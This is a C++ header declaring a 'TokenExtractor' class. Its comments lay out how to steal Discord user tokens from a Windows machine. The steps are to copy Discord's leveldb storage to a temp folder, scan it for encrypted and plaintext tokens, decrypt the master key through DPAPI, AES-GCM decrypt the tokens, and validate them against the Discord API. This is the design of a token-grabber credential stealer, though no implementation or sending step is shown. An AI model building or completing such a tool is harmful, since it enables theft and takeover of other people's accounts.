#pragma once

#include <string>
#include <vector>

struct ExtractedToken {
    std::string token;
    bool        is_valid = false;
    std::string username; // filled after validation
};

class TokenExtractor {
public:
    // Attempts to extract the Discord user token from local storage.
    // Tries stable, canary, ptb, development Discord installs.
    // Returns all found tokens (validated ones have is_valid=true).
    static std::vector<ExtractedToken> Extract();

    // Validates a token by calling GET /users/@me.
    // Returns true if 200, fills username on success.
    static bool ValidateToken(const std::string& token, std::string& out_username);

private:
    // Get %APPDATA% path
    static std::string GetAppDataPath();

    // Copy leveldb files to temp dir (Discord locks them while running)
    static bool CopyLeveldbToTemp(const std::string& leveldb_path, std::string& out_temp_path);

    // Scan a file's raw bytes for encrypted token prefix (dQw4w9WgXcQ:)
    static std::vector<std::string> FindEncryptedTokens(const std::string& file_path);

    // Scan a file's raw bytes for plaintext token patterns
    static std::vector<std::string> FindPlaintextTokens(const std::string& file_path);

    // Read Local State and decrypt the master key via DPAPI
    static bool GetMasterKey(const std::string& discord_path, std::vector<uint8_t>& out_key);

    // Decrypt an AES-256-GCM encrypted token using the master key
    static std::string DecryptToken(const std::vector<uint8_t>& master_key,
                                     const std::string& encrypted_b64);

    // Base64 decode
    static std::vector<uint8_t> Base64Decode(const std::string& input);

    // Scan all leveldb files in dir for tokens; discord_path is the parent
    // Discord install dir (e.g. %APPDATA%\discord) used to load the master key.
    static std::vector<std::string> ScanLeveldb(const std::string& dir,
                                                  const std::string& discord_path);
};